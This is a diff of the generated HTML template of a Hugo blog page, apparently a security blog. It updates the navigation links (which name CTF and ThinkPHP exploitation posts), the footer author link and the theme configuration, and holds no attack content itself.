+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/nosql/">NOSQL</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/n1start/" class="prev" rel="prev" title="N1start"><i class="fas fa-angle-left fa-fw"></i>N1start</a>
-            <a href="/posts/phar/" class="next" rel="next" title="Phar">Phar<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/posts/ctfshow-yuandan/" class="prev" rel="prev" title="CTFshow元旦水友赛部分wp-web"><i class="fas fa-angle-left fa-fw"></i>CTFshow元旦水友赛部分wp-web</a>
+            <a href="/posts/sql-rce/" class="next" rel="next" title="thinkphp3.2.3 nday到rce深度利用">thinkphp3.2.3 nday到rce深度利用<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
-</article></div>
+<div id="comments"></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
                     Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
             </div>
@@ -144,7 +1599,7 @@
         </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
             <i class="fas fa-comment fa-fw"></i>
         </a>
-    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"desktop-header-typeit":"DELETE's blog","mobile-header-typeit":"DELETE's blog"},"typeit":{"cursorChar":null,"cursorSpeed":null,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":null,"speed":null}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
 </body>
 
 </html>
